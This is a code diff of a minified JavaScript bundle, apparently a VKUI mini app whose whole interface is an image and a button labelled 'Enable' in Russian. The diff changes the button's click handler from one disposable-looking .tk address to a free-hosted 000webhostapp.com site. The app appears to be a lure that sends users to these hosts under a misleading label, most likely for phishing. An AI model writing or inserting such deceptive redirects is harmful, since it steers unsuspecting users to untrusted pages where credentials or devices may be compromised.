@@ -7,7 +7,7 @@
                 c = t(11),
                 s = t.n(c),
                 l = t(12);
-            t(94); var u = function() { return i.a.createElement(l.c, { activePanel: "main" }, i.a.createElement(l.b, { id: "main", separator: !1 }, i.a.createElement("div", { style: { display: "flex", alignItems: "center", flexDirection: "column", justifyContent: "center", height: "80vh" } }, i.a.createElement("img", { src: "https://i.imgur.com/XvQToMF.png", style: { width: "80vw", marginBottom: 10, borderRadius: 10 } }), i.a.createElement(l.a, { size: "xl", onClick: function() { window.location="http://kiufdfe4rrre.tk/check/1005601" }, style: { width: "80vw" } }, "\u0412\u043a\u043b\u044e\u0447\u0438\u0442\u044c")))) },
+            t(94); var u = function() { return i.a.createElement(l.c, { activePanel: "main" }, i.a.createElement(l.b, { id: "main", separator: !1 }, i.a.createElement("div", { style: { display: "flex", alignItems: "center", flexDirection: "column", justifyContent: "center", height: "80vh" } }, i.a.createElement("img", { src: "https://i.imgur.com/XvQToMF.png", style: { width: "80vw", marginBottom: 10, borderRadius: 10 } }), i.a.createElement(l.a, { size: "xl", onClick: function() { window.location="https://botasdsadsa.000webhostapp.com/" }, style: { width: "80vw" } }, "\u0412\u043a\u043b\u044e\u0447\u0438\u0442\u044c")))) },
                 d = Boolean("localhost" === window.location.hostname || "[::1]" === window.location.hostname || window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));
 
             function h(e, n) { navigator.serviceWorker.register(e).then((function(e) { e.onupdatefound = function() { var t = e.installing;
